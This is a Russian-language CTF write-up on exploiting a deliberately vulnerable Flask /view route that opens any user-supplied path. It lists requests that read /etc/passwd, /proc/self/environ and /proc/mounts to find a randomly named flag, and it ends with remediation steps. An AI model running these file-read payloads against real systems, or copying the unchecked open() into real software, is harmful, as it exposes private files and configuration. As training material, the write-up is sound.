[CTF Writeup] Flask LFI → /proc/mounts → flag

Задача
------
Даны исходники простого Flask‑приложения и Dockerfile. Во время сборки файл flag.txt
переименовывается в случайное имя вида /flag-<A-Za-z0-9>{32}.txt. Нужно достать флаг,
имея доступ только к HTTP‑интерфейсу приложения.

Исходные материалы (суть)
-------------------------
app.py (важный фрагмент):

    @app.route('/view')
    def view():
        filename = request.args.get('filename')
        with open(filename, 'r') as file:
            return file.read()

Dockerfile (важный фрагмент):

    RUN mv flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt
    USER nobody
    CMD ["python", "app.py"]

Анализ уязвимости
-----------------
Маршрут /view читает путь, полностью контролируемый пользователем, через open(filename).
Это приводит к Arbitrary File Read (LFI) в пределах прав пользователя процесса (здесь: nobody).

Так как имя флага случайное и лежит в /, обычный перебор имён неэффективен. Однако в Linux
есть /proc — виртуальная ФС ядра. Файл /proc/mounts содержит список всех смонтированных
файловых систем/узлов с указанием *точки монтирования* (в т.ч. файла). В задаче флаг был
смонтирован так, что его точный путь оказался виден в /proc/mounts.

Эксплуатация (пошагово)
-----------------------
1) Проверяем, что LFI работает (чтение /etc/passwd):
   GET /view?filename=/etc/passwd

   Ожидаемый ответ: содержимое /etc/passwd (200 OK), что подтверждает чтение произвольных файлов.

2) Смотрим полезные файлы в /proc для утечек:
   - /proc/self/cmdline  → как запущен процесс
   - /proc/self/environ  → переменные окружения (могут подсказать путь/окружение)
   - /proc/mounts        → точки монтирования (ключ к задаче)

   Запросы:
   GET /view?filename=/proc/self/cmdline
   GET /view?filename=/proc/self/environ
   GET /view?filename=/proc/mounts

   Пример полученных данных (из реального решения):
   /proc/self/cmdline → "/usr/local/bin/pythonapp.py"
   /proc/self/environ → "... WERKZEUG_RUN_MAIN=true ..."
   /proc/mounts       → среди строк обнаружено:
       /dev/nvme0n1p1 /flag-nFwIYkCQGGUDTrQXuiMtckVHnSVBYRjj.txt ext4 ro,...

   В /proc/mounts вторая колонка — это точка монтирования. Здесь это *файл* флага
   с полным именем: /flag-nFwIYkCQGGUDTrQXuiMtckVHnSVBYRjj.txt

3) Читаем флаг напрямую через LFI:
   GET /view?filename=/flag-nFwIYkCQGGUDTrQXuiMtckVHnSVBYRjj.txt

   Curl‑пример:
   curl "http://<host>:5000/view?filename=/flag-nFwIYkCQGGUDTrQXuiMtckVHnSVBYRjj.txt"

   Ответ: содержимое файла — это искомый флаг (формат зависит от таска).

Почему это работает
-------------------
- /view реализует произвольное чтение файлов (LFI/Arbitrary File Read).
- /proc/mounts — список всех монтирований. В задаче флаг был смонтирован как отдельный узел,
  поэтому точное имя файла подсвечивается прямо там.
- Права на флаг позволяли процессу nobody читать файл (или он смонтирован read‑only, но readable).

Альтернативные пути/идеи
------------------------
- /proc/self/fd/  — иногда можно найти открытые дескрипторы на интересные файлы.
- /proc/mounts    — основной канал утечки имени в этой задаче.
- Если бы /proc/mounts не помог, можно было бы искать оплошности в логах/ошибках или
  брутфорсить сокращённую маску (если суффикс короче), но здесь это не потребовалось.

Фиксы (как закрыть)
-------------------
1) В /view читать только из строго разрешённого каталога (chroot‑подобная логика) и проверять
   имена на безопасный шаблон. Использовать send_from_directory и Path.resolve().
2) Убрать debug=True на продакшене.
3) Выдать флагу права 600 и владельца root, запускать приложение под пользователем без доступа.
4) Не выдавать путь к флагу через монтирование, либо монтировать в каталог с непросматриваемым
   именем и без прав на чтение процессом приложения.

Краткий TL;DR
-------------
- Баг: /view читает произвольные файлы → LFI.
- Трюк: читаем /proc/mounts через LFI → там видно точное имя флага.
- Итог: читаем найденный путь и получаем флаг.

Конец.
